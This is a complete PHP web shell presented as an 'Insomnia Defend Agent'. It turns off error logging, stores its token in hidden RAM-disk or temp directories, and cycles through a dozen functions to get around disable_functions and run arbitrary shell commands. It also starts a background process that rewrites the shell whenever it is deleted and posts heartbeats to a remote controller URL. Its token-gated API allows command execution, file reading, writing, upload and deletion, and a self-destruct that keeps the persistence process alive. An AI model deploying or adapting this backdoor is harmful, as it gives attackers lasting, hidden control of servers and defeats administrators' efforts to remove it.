<?php


@ini_set('open_basedir', NULL);
@ini_set('safe_mode', 'Off');
@ini_set('display_errors', 0);
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@set_time_limit(0);
@putenv('TMPDIR=/tmp');

if (function_exists('apache_setenv')) {
    @apache_setenv('no-gzip', 1);
}

// ============================================
// SMART TOKEN DIRECTORY DETECTION
// ============================================
function get_secure_token_dir()
{
    $dir_name = '.insomnia_' . substr(md5(__FILE__), 0, 8);

    if (DIRECTORY_SEPARATOR === '/') {
        // Linux/Unix - Try RAM disk first!
        if (@is_writable('/dev/shm')) {
            $token_dir = '/dev/shm/' . $dir_name;
        } elseif (@is_writable('/tmp')) {
            $token_dir = '/tmp/' . $dir_name;
        } else {
            // Fallback
            $token_dir = sys_get_temp_dir() . '/' . $dir_name;
        }
    } else {
        // Windows - Use TEMP
        $temp = getenv('TEMP') ?: getenv('TMP') ?: sys_get_temp_dir();
        $token_dir = $temp . '\\' . $dir_name;
    }

    if (!@is_dir($token_dir)) {
        @mkdir($token_dir, 0777, true);

        // Hide on Windows
        if (DIRECTORY_SEPARATOR === '\\') {
            @exec('attrib +h ' . escapeshellarg($token_dir));
        }
    }

    return $token_dir;
}

$TOKEN_DIR = get_secure_token_dir();

// Session setup (local untuk PHP session saja)
$local_session = dirname(__FILE__) . '/.session';
if (!@is_dir($local_session)) {
    @mkdir($local_session, 0777, true);
}
if (@is_writable($local_session)) {
    @session_save_path($local_session);
}

ob_start();
session_start();

// ============================================
// CONFIGURATION
// ============================================
define('AGENT_VERSION', '2.1');
define('TOKEN_FILE', $TOKEN_DIR . '/token');
define('PID_FILE', $TOKEN_DIR . '/pid');
define('CONFIG_FILE', $TOKEN_DIR . '/config.json');
define('PERSIST_FILE', $TOKEN_DIR . '/persist.php');

// ============================================
// HELPER FUNCTIONS
// ============================================

function ajx_path($p)
{
    $p = str_replace(array('\\\\', '\\'), '/', $p);
    return $p !== '/' && !preg_match('/^[a-zA-Z]:\/$/', $p) ? rtrim($p, '/') : $p;
}

function generate_token($length = 32)
{
    return bin2hex(random_bytes($length));
}

function verify_token($provided_token)
{
    if (!file_exists(TOKEN_FILE)) return false;
    $stored_token = trim(@file_get_contents(TOKEN_FILE));
    return hash_equals($stored_token, $provided_token);
}

function get_config()
{
    if (file_exists(CONFIG_FILE)) {
        return json_decode(@file_get_contents(CONFIG_FILE), true) ?: [];
    }
    return [];
}

function save_config($config)
{
    @file_put_contents(CONFIG_FILE, json_encode($config, JSON_PRETTY_PRINT));
}

// ============================================
// MULTI-TERMINAL BYPASS SYSTEM
// ============================================

class TerminalBypass
{
    private $methods = [];
    private $disabled = [];

    public function __construct()
    {
        $this->detect_disabled();
        $this->init_methods();
    }

    private function detect_disabled()
    {
        $disable_functions = ini_get('disable_functions');
        if ($disable_functions) {
            $this->disabled = array_map('trim', explode(',', $disable_functions));
        }
    }

    private function is_enabled($func)
    {
        return function_exists($func) && !in_array($func, $this->disabled);
    }

    private function init_methods()
    {
        // Method 1: system()
        if ($this->is_enabled('system')) {
            $this->methods[] = [
                'name' => 'system',
                'func' => function ($cmd) {
                    ob_start();
                    @system($cmd . ' 2>&1');
                    return ob_get_clean();
                }
            ];
        }

        // Method 2: exec()
        if ($this->is_enabled('exec')) {
            $this->methods[] = [
                'name' => 'exec',
                'func' => function ($cmd) {
                    @exec($cmd . ' 2>&1', $output);
                    return implode("\n", $output);
                }
            ];
        }

        // Method 3: shell_exec()
        if ($this->is_enabled('shell_exec')) {
            $this->methods[] = [
                'name' => 'shell_exec',
                'func' => function ($cmd) {
                    return @shell_exec($cmd . ' 2>&1');
                }
            ];
        }

        // Method 4: passthru()
        if ($this->is_enabled('passthru')) {
            $this->methods[] = [
                'name' => 'passthru',
                'func' => function ($cmd) {
                    ob_start();
                    @passthru($cmd . ' 2>&1');
                    return ob_get_clean();
                }
            ];
        }

        // Method 5: proc_open()
        if ($this->is_enabled('proc_open')) {
            $this->methods[] = [
                'name' => 'proc_open',
                'func' => function ($cmd) {
                    $descriptors = [
                        0 => ['pipe', 'r'],
                        1 => ['pipe', 'w'],
                        2 => ['pipe', 'w']
                    ];
                    $process = @proc_open($cmd, $descriptors, $pipes);
                    if (is_resource($process)) {
                        @fclose($pipes[0]);
                        $output = @stream_get_contents($pipes[1]);
                        $error = @stream_get_contents($pipes[2]);
                        @fclose($pipes[1]);
                        @fclose($pipes[2]);
                        @proc_close($process);
                        return $output . $error;
                    }
                    return '';
                }
            ];
        }

        // Method 6: popen()
        if ($this->is_enabled('popen')) {
            $this->methods[] = [
                'name' => 'popen',
                'func' => function ($cmd) {
                    $handle = @popen($cmd . ' 2>&1', 'r');
                    if ($handle) {
                        $output = @stream_get_contents($handle);
                        @pclose($handle);
                        return $output;
                    }
                    return '';
                }
            ];
        }

        // Method 7: pcntl_exec() - Unix only
        if ($this->is_enabled('pcntl_exec') && DIRECTORY_SEPARATOR === '/') {
            $this->methods[] = [
                'name' => 'pcntl_exec',
                'func' => function ($cmd) {
                    // Note: pcntl_exec replaces current process
                    return '[pcntl_exec available but not suitable for this]';
                }
            ];
        }

        // Method 8: backticks
        if ($this->is_enabled('shell_exec')) {
            $this->methods[] = [
                'name' => 'backticks',
                'func' => function ($cmd) {
                    return @`$cmd 2>&1`;
                }
            ];
        }

        // Method 9: COM object (Windows only)
        if (class_exists('COM') && DIRECTORY_SEPARATOR === '\\') {
            $this->methods[] = [
                'name' => 'com_wscript',
                'func' => function ($cmd) {
                    try {
                        $shell = new COM('WScript.Shell');
                        $exec = $shell->Exec('cmd.exe /c ' . $cmd);
                        $stdout = $exec->StdOut();
                        $output = $stdout->ReadAll();
                        return $output;
                    } catch (Exception $e) {
                        return '';
                    }
                }
            ];
        }

        // Method 10: FFI (PHP 7.4+)
        if (class_exists('FFI') && version_compare(PHP_VERSION, '7.4.0') >= 0) {
            $this->methods[] = [
                'name' => 'ffi',
                'func' => function ($cmd) {
                    try {
                        $ffi = FFI::cdef("int system(const char *command);");
                        ob_start();
                        $ffi->system($cmd);
                        return ob_get_clean();
                    } catch (Exception $e) {
                        return '';
                    }
                }
            ];
        }

        // Method 11: Full path bypass (Windows)
        if (DIRECTORY_SEPARATOR === '\\') {
            $this->methods[] = [
                'name' => 'cmd_fullpath',
                'func' => function ($cmd) {
                    $output = [];
                    @exec('C:\\Windows\\System32\\cmd.exe /c ' . $cmd . ' 2>&1', $output);
                    return implode("\n", $output);
                }
            ];
        }

        // Method 12: Unix sh full path
        if (DIRECTORY_SEPARATOR === '/') {
            $this->methods[] = [
                'name' => 'sh_fullpath',
                'func' => function ($cmd) {
                    $output = [];
                    @exec('/bin/sh -c ' . escapeshellarg($cmd) . ' 2>&1', $output);
                    return implode("\n", $output);
                }
            ];
        }
    }

    public function execute($cmd, $cwd = null)
    {
        if ($cwd) {
            @chdir($cwd);
        }

        foreach ($this->methods as $method) {
            try {
                $result = $method['func']($cmd);
                if ($result !== false && $result !== null && $result !== '') {
                    return [
                        'success' => true,
                        'output' => $result,
                        'method' => $method['name']
                    ];
                }
            } catch (Exception $e) {
                continue;
            }
        }

        return [
            'success' => false,
            'output' => 'All terminal methods failed or disabled',
            'method' => 'none'
        ];
    }

    public function get_available_methods()
    {
        return array_column($this->methods, 'name');
    }

    public function get_disabled_functions()
    {
        return $this->disabled;
    }
}

// Initialize terminal
$terminal = new TerminalBypass();

// ============================================
// PID INJECTION & PERSISTENCE - FIXED!
// ============================================

function inject_to_pid()
{
    // Create INDEPENDENT persistence script
    $self_source = base64_encode(@file_get_contents(__FILE__));

    // Create INDEPENDENT persistence script
    $persist_code = '<?php
@set_time_limit(0);
@ignore_user_abort(true);
@ini_set("display_errors", 0);

$token_dir = "' . $GLOBALS['TOKEN_DIR'] . '";
$config_file = $token_dir . "/config.json";
$original_path = "' . __FILE__ . '"; // Path asli cn.php
$backup_source = base64_decode("' . $self_source . '");

while (true) {
    try {
        // 1. Cek apakah shell utama (cn.php) masih ada
        if (!file_exists($original_path)) {
            // Kalau dihapus, BANGKITKAN KEMBALI!
            @file_put_contents($original_path, $backup_source);
            @chmod($original_path, 0644);
            
            // Atau kalau lu mau dia nyamar di folder lain:
            // $hidden_path = dirname($original_path) . "/.hidden_index.php";
            // @file_put_contents($hidden_path, $backup_source);
        }
        
        // 2. Heartbeat Logic (tetap seperti semula)
        if (file_exists($config_file)) {
            $config = @json_decode(@file_get_contents($config_file), true);
            if ($config && isset($config["wiki_url"])) {
                if (function_exists("curl_init")) {
                    $ch = @curl_init($config["wiki_url"] . "/api/heartbeat");
                    if ($ch) {
                        @curl_setopt($ch, CURLOPT_POST, true);
                        @curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
                            "status" => "alive_and_regenerating"
                        ]));
                        @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                        @curl_exec($ch);
                        @curl_close($ch);
                    }
                }
            }
        }
    } catch (Exception $e) {}
    @sleep(10);
}
';

    // Save persistence script
    @file_put_contents(PERSIST_FILE, $persist_code);

    // Execute in background
    if (DIRECTORY_SEPARATOR === '/') {
        // Linux - Use nohup and redirect output
        $cmd = "nohup php " . escapeshellarg(PERSIST_FILE) . " > /dev/null 2>&1 & echo $!";
        $pid = trim(@shell_exec($cmd));

        if (empty($pid)) {
            // Fallback method
            $cmd2 = "php " . escapeshellarg(PERSIST_FILE) . " > /dev/null 2>&1 & echo $!";
            $pid = trim(@shell_exec($cmd2));
        }
    } else {
        // Windows - Use start /B
        $cmd = 'start /B php ' . escapeshellarg(PERSIST_FILE) . ' > NUL 2>&1';
        @pclose(@popen($cmd, 'r'));
        $pid = 'win_' . time();
    }

    // Save PID
    @file_put_contents(PID_FILE, $pid);

    // Mark persistence as active
    $config = get_config();
    $config['persistence_active'] = true;
    $config['persistence_started'] = time();
    save_config($config);

    return $pid;
}

function check_persistence()
{
    if (!file_exists(PID_FILE)) return false;

    $pid = trim(@file_get_contents(PID_FILE));
    if (empty($pid)) return false;

    if (DIRECTORY_SEPARATOR === '/') {
        // Linux - Check if process exists
        $result = @shell_exec("ps -p $pid 2>/dev/null");
        return $result && strpos($result, $pid) !== false;
    } else {
        // Windows - Check if persist file was modified recently (within last 2 minutes)
        $last_modified = @filemtime(PERSIST_FILE);
        return $last_modified && (time() - $last_modified) < 120;
    }
}

// ============================================
// API ENDPOINTS
// ============================================

if (isset($_POST['action'])) {
    @ini_set('display_errors', 0);
    while (ob_get_level()) {
        ob_end_clean();
    }
    header('Content-Type: application/json');

    $action = $_POST['action'];

    // Token verification (except for token generation and ping)
    if (!in_array($action, ['generate_token', 'ping'])) {
        $token = $_POST['token'] ?? '';
        if (!verify_token($token)) {
            echo json_encode(['success' => false, 'error' => 'Invalid token']);
            exit;
        }
    }

    try {
        // Generate Token
        if ($action === 'generate_token') {
            $token = generate_token();
            @file_put_contents(TOKEN_FILE, $token);

            $wiki_url = $_POST['wiki_url'] ?? '';
            $server_url = $_POST['server_url'] ?? '';

            $config = [
                'token' => $token,
                'created' => time(),
                'hostname' => gethostname(),
                'wiki_url' => $wiki_url,
                'server_url' => $server_url,
                'token_dir' => $GLOBALS['TOKEN_DIR']
            ];
            save_config($config);

            // Inject to PID for persistence
            $pid = inject_to_pid();

            // Wait a bit for process to start
            sleep(1);

            $persistence_status = check_persistence();

            echo json_encode([
                'success' => true,
                'token' => $token,
                'pid' => $pid,
                'hostname' => gethostname(),
                'php_version' => PHP_VERSION,
                'os' => PHP_OS,
                'token_dir' => $GLOBALS['TOKEN_DIR'],
                'persistence' => $persistence_status,
                'message' => 'Token generated. PID injected at: ' . PERSIST_FILE
            ]);
            exit;
        }

        // Ping / Health Check
        if ($action === 'ping') {
            $config = get_config();

            echo json_encode([
                'success' => true,
                'hostname' => gethostname(),
                'php_version' => PHP_VERSION,
                'os' => PHP_OS,
                'persistence' => check_persistence(),
                'token_dir' => $GLOBALS['TOKEN_DIR'],
                'persist_file' => PERSIST_FILE,
                'persist_exists' => file_exists(PERSIST_FILE),
                'available_methods' => $terminal->get_available_methods(),
                'disabled_functions' => $terminal->get_disabled_functions(),
                'config' => $config
            ]);
            exit;
        }

        // List Directory (with pagination)
        if ($action === 'list_dir') {
            $target_dir = ajx_path($_POST['target_dir'] ?? getcwd());
            $page = intval($_POST['page'] ?? 1);
            $per_page = intval($_POST['per_page'] ?? 25);

            if (!@is_dir($target_dir)) {
                throw new Exception('Directory not found');
            }

            $items = [];
            $files = @scandir($target_dir);

            if ($files) {
                foreach ($files as $file) {
                    if ($file === '.' || $file === '..') continue;

                    $full_path = $target_dir . '/' . $file;
                    $is_dir = @is_dir($full_path);

                    $items[] = [
                        'name' => $file,
                        'type' => $is_dir ? 'dir' : 'file',
                        'size' => $is_dir ? 0 : @filesize($full_path),
                        'perms' => substr(sprintf('%o', @fileperms($full_path)), -4),
                        'modified' => @filemtime($full_path),
                        'path' => $full_path
                    ];
                }
            }

            // Sort: directories first
            usort($items, function ($a, $b) {
                if ($a['type'] === $b['type']) {
                    return strcasecmp($a['name'], $b['name']);
                }
                return $a['type'] === 'dir' ? -1 : 1;
            });

            $total = count($items);
            $total_pages = $per_page > 0 ? ceil($total / $per_page) : 1;
            $offset = ($page - 1) * $per_page;
            $paginated_items = $per_page > 0 ? array_slice($items, $offset, $per_page) : $items;

            echo json_encode([
                'success' => true,
                'current_dir' => $target_dir,
                'items' => $paginated_items,
                'pagination' => [
                    'total' => $total,
                    'page' => $page,
                    'per_page' => $per_page,
                    'total_pages' => $total_pages
                ]
            ]);
            exit;
        }

        // Execute Terminal Command
        if ($action === 'terminal') {
            $cmd = $_POST['cmd'] ?? '';
            $cwd = $_POST['cwd'] ?? getcwd();

            if (empty($cmd)) {
                throw new Exception('No command provided');
            }

            $result = $terminal->execute($cmd, $cwd);

            echo json_encode([
                'success' => $result['success'],
                'output' => $result['output'],
                'method' => $result['method'],
                'cwd' => getcwd()
            ]);
            exit;
        }

        // Read File
        if ($action === 'read_file') {
            $path = ajx_path($_POST['path'] ?? '');

            if (!@is_file($path)) {
                throw new Exception('File not found');
            }

            $content = @file_get_contents($path);

            echo json_encode([
                'success' => true,
                'content' => $content,
                'size' => strlen($content)
            ]);
            exit;
        }

        // Save File
        if ($action === 'save_file') {
            $path = ajx_path($_POST['path'] ?? '');
            $content = $_POST['content'] ?? '';

            if (@file_put_contents($path, $content) !== false) {
                echo json_encode(['success' => true, 'message' => 'File saved']);
            } else {
                throw new Exception('Failed to write file');
            }
            exit;
        }

        // Create File
        if ($action === 'create_file') {
            $target_dir = ajx_path($_POST['target_dir'] ?? getcwd());
            $filename = $_POST['filename'] ?? '';
            $content = $_POST['content'] ?? '';

            if (empty($filename)) {
                throw new Exception('Filename is required');
            }

            $full_path = $target_dir . '/' . basename($filename);

            if (@file_exists($full_path)) {
                throw new Exception('File already exists');
            }

            if (@file_put_contents($full_path, $content) !== false) {
                echo json_encode(['success' => true, 'message' => 'File created']);
            } else {
                throw new Exception('Failed to create file');
            }
            exit;
        }

        // Upload File
        if ($action === 'upload_file') {
            $target_dir = ajx_path($_POST['target_dir'] ?? '');

            if (!isset($_FILES['file'])) {
                throw new Exception('No file uploaded');
            }

            $file = $_FILES['file'];
            $destination = $target_dir . '/' . basename($file['name']);

            if (move_uploaded_file($file['tmp_name'], $destination)) {
                echo json_encode(['success' => true, 'message' => 'File uploaded']);
            } else {
                throw new Exception('Upload failed');
            }
            exit;
        }

        // Delete File/Folder
        if ($action === 'delete') {
            $path = ajx_path($_POST['path'] ?? '');

            if (@is_dir($path)) {
                // Recursive delete
                $it = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::CHILD_FIRST
                );
                foreach ($it as $file) {
                    if ($file->isDir()) {
                        @rmdir($file->getRealPath());
                    } else {
                        @unlink($file->getRealPath());
                    }
                }
                @rmdir($path);
            } else {
                @unlink($path);
            }

            echo json_encode(['success' => true, 'message' => 'Deleted']);
            exit;
        }

        // Rename
        if ($action === 'rename') {
            $old_path = ajx_path($_POST['old_path'] ?? '');
            $new_name = $_POST['new_name'] ?? '';
            $new_path = dirname($old_path) . '/' . $new_name;

            if (@rename($old_path, $new_path)) {
                echo json_encode(['success' => true, 'message' => 'Renamed']);
            } else {
                throw new Exception('Rename failed');
            }
            exit;
        }

        // Self Destruct
        if ($action === 'self_destruct') {
            if (check_persistence()) {
                $this_file = __FILE__;

                echo json_encode([
                    'success' => true,
                    'message' => 'Agent will self-destruct. Persistence remains active at: ' . PERSIST_FILE,
                    'persist_file' => PERSIST_FILE,
                    'token_dir' => $GLOBALS['TOKEN_DIR']
                ]);

                // Delete after response sent
                register_shutdown_function(function () use ($this_file) {
                    @unlink($this_file);
                });
            } else {
                throw new Exception('Cannot self-destruct: Persistence not active');
            }
            exit;
        }
    } catch (Exception $e) {
        echo json_encode(['success' => false, 'error' => $e->getMessage()]);
        exit;
    }
}

// ============================================
// HTML UI
// ============================================
?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Insomnia Defend Agent</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #0f0;
            padding: 20px;
        }

        .container {
            max-width: 900px;
            margin: 0 auto;
        }

        h1 {
            color: #0f0;
            margin-bottom: 20px;
            text-align: center;
        }

        .box {
            background: #1a1a1a;
            border: 1px solid #0f0;
            padding: 20px;
            margin-bottom: 20px;
            border-radius: 5px;
        }

        .info-item {
            background: #0a0a0a;
            padding: 10px;
            margin: 5px 0;
            border-left: 3px solid #0f0;
        }

        input {
            width: 100%;
            padding: 10px;
            background: #000;
            color: #0f0;
            border: 1px solid #0f0;
            margin-bottom: 10px;
            font-family: monospace;
        }

        button {
            padding: 10px 20px;
            background: #0f0;
            color: #000;
            border: none;
            cursor: pointer;
            font-weight: bold;
            border-radius: 3px;
            margin-right: 10px;
        }

        button:hover {
            background: #0c0;
        }

        .output {
            background: #000;
            padding: 15px;
            border: 1px solid #0f0;
            margin-top: 10px;
            min-height: 100px;
            font-size: 12px;
            word-break: break-all;
            max-height: 400px;
            overflow-y: auto;
        }

        .success {
            color: #0f0;
        }

        .error {
            color: #f00;
        }

        .info {
            color: #ff0;
        }

        .warning {
            color: #ffa500;
        }
    </style>
</head>

<body>
    <div class="container">
        <h1>🛡️ INSOMNIA DEFEND AGENT v<?php echo AGENT_VERSION; ?></h1>

        <div class="box">
            <h2>📍 Token Storage Location</h2>
            <div class="info-item">
                <strong>Directory:</strong> <span class="info"><?php echo htmlspecialchars($TOKEN_DIR); ?></span><br>
                <strong>Type:</strong> <?php
                                        if (strpos($TOKEN_DIR, '/dev/shm') !== false) {
                                            echo '<span class="success">RAM Disk (No traces!)</span>';
                                        } elseif (strpos($TOKEN_DIR, '/tmp') !== false) {
                                            echo '<span class="success">Temp Directory</span>';
                                        } else {
                                            echo '<span class="warning">System Temp</span>';
                                        }
                                        ?>
            </div>
        </div>

        <div class="box">
            <h2>Step 1: Generate Token</h2>
            <input type="text" id="wiki_url" placeholder="Wiki URL (e.g., http://localhost:8501)" value="http://localhost:8501">
            <input type="text" id="server_url" placeholder="This server URL (auto-filled)" value="<?php echo htmlspecialchars('https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']); ?>">
            <button onclick="generateToken()">🔑 Generate Token & Inject PID</button>
            <div id="token_output" class="output"></div>
        </div>

        <div class="box">
            <h2>Step 2: Test Connection</h2>
            <button onclick="testConnection()">🔍 Ping Agent</button>
            <button onclick="testPersistence()">🔄 Check Persistence</button>
            <div id="ping_output" class="output"></div>
        </div>

        <div class="box info">
            <h2>ℹ️ Instructions</h2>
            <p>1. Enter your Wiki URL and verify Server URL</p>
            <p>2. Click "Generate Token" - This will inject a persistent PID</p>
            <p>3. <strong class="warning">COPY THE TOKEN!</strong> You need it for Wiki</p>
            <p>4. Go to Wiki → Defend → Create Connection</p>
            <p>5. Paste Server URL and Token</p>
            <p>6. Once connected and persistence is active, <strong>this file can be DELETED</strong></p>
            <p>7. Connection will persist via background process in <span class="info"><?php echo htmlspecialchars($TOKEN_DIR); ?></span></p>
        </div>
    </div>

    <script>
        async function generateToken() {
            const wiki_url = document.getElementById('wiki_url').value;
            const server_url = document.getElementById('server_url').value;
            const output = document.getElementById('token_output');
            output.innerHTML = '<span class="info">Generating token and injecting PID...</span>';

            try {
                const formData = new FormData();
                formData.append('action', 'generate_token');
                formData.append('wiki_url', wiki_url);
                formData.append('server_url', server_url);

                const response = await fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                });

                const data = await response.json();

                if (data.success) {
                    output.innerHTML = `
                        <span class="success">✅ Success!</span><br><br>
                        <div class="info-item">
                            <strong>🔑 TOKEN (COPY THIS!):</strong><br>
                            <textarea readonly style="width:100%; height:60px; background:#000; color:#0ff; border:1px solid #0ff; padding:8px; margin:5px 0; font-family:monospace; font-size:13px;" onclick="this.select(); document.execCommand('copy');">${data.token}</textarea>
                            <div style="color:#888; font-size:10px; text-align:center;">👆 Click to select & copy</div>
                        </div>
                        <br>
                        <div class="info-item">
                            <strong>Server Info:</strong><br>
                            • Hostname: ${data.hostname}<br>
                            • PID: ${data.pid}<br>
                            • PHP: ${data.php_version}<br>
                            • OS: ${data.os}<br>
                            • Token Dir: ${data.token_dir}<br>
                            • Persistence: ${data.persistence ? '<span class="success">✅ Active</span>' : '<span class="error">❌ Not started</span>'}
                        </div>
                        <br>
                        <div class="warning">
                            <strong>⚠️ NEXT STEPS:</strong><br>
                            1. Copy token above<br>
                            2. Go to Wiki → Defend → Create Connection<br>
                            3. Server URL: <code>${data.server_url || server_url}</code><br>
                            4. Token: (paste from above)<br>
                            5. After connection established, you can DELETE this file!<br>
                            6. Persistence will continue running ✅
                        </div>
                    `;
                } else {
                    output.innerHTML = `<span class="error">❌ Error: ${data.error}</span>`;
                }
            } catch (e) {
                output.innerHTML = `<span class="error">❌ Error: ${e.message}</span>`;
            }
        }

        async function testConnection() {
            const output = document.getElementById('ping_output');
            output.innerHTML = '<span class="info">Pinging agent...</span>';

            try {
                const formData = new FormData();
                formData.append('action', 'ping');

                const response = await fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                });

                const data = await response.json();

                if (data.success) {
                    output.innerHTML = `
                        <span class="success">✅ Agent is alive!</span><br><br>
                        <div class="info-item">
                            <strong>Hostname:</strong> ${data.hostname}<br>
                            <strong>PHP:</strong> ${data.php_version}<br>
                            <strong>OS:</strong> ${data.os}<br>
                            <strong>Token Dir:</strong> ${data.token_dir}<br>
                            <strong>Persist File:</strong> ${data.persist_file}<br>
                            <strong>Persist Exists:</strong> ${data.persist_exists ? '✅ Yes' : '❌ No'}<br>
                            <strong>Persistence:</strong> ${data.persistence ? '<span class="success">✅ Active</span>' : '<span class="error">❌ Inactive</span>'}<br>
                            <strong>Available Methods:</strong> ${data.available_methods.join(', ')}<br>
                            <strong>Disabled Functions:</strong> ${data.disabled_functions.length > 0 ? data.disabled_functions.join(', ') : 'None'}
                        </div>
                    `;
                } else {
                    output.innerHTML = `<span class="error">❌ Error: ${data.error}</span>`;
                }
            } catch (e) {
                output.innerHTML = `<span class="error">❌ Error: ${e.message}</span>`;
            }
        }

        async function testPersistence() {
            await testConnection();
        }
    </script>
</body>

</html>
